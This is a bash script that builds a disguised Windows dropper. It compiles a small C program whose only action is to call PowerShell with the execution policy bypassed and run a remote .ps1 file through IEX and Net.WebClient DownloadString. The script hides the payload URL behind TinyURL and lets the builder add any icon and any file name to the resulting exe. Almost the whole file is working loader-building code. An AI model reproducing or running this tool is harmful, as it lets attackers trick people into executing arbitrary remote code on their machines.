#!/bin/bash
#creates exe for windows from remove powershell script
clear

if [ "$1" != "" ]
then
    url="$1"
else
    echo "What is the URL of the ps1 file?"
    read $url
fi

mkdir -p win32/bin
mkdir -p win32/res

echo "Getting tiny url..."
url="$(wget -q "http://tinyurl.com/api-create.php?url=$url" -O-)"

echo "$url"

echo "Creating main.c..."
echo "#include <stdio.h>" > win32/main.c
echo "int main(){" >> win32/main.c
echo "    system(\"powershell -executionpolicy bypass \\\"IEX (New-Object Net.WebClient).DownloadString('$url'); Main\\\"\");">> win32/main.c
echo "}" >> win32/main.c


if [ "$2" != "" ]
then
    echo "Creating ICON resource..."
    icon="win32/res/icon.ico"
    convert -resize x64 -gravity center -crop 64x64+0+0 $2 \
    -background transparent \
    -flatten -colors 256 $icon
    
    echo "id ICON $icon" > main.rc

    echo "Compiling..."
    i586-mingw32msvc-windres -o win32/ico.o win32/main.rc
    i586-mingw32msvc-gcc win32/main.c win32/ico.o -o win32/bin/main.exe
else
    echo "Compiling..."
    i586-mingw32msvc-gcc win32/main.c -o win32/bin/main.exe
fi

echo "What would you like to name the output EXE file?"
read exe

mv "win32/bin/main.exe" "win32/bin/$exe"

echo "Executable created as 'win32/bin/$exe'"
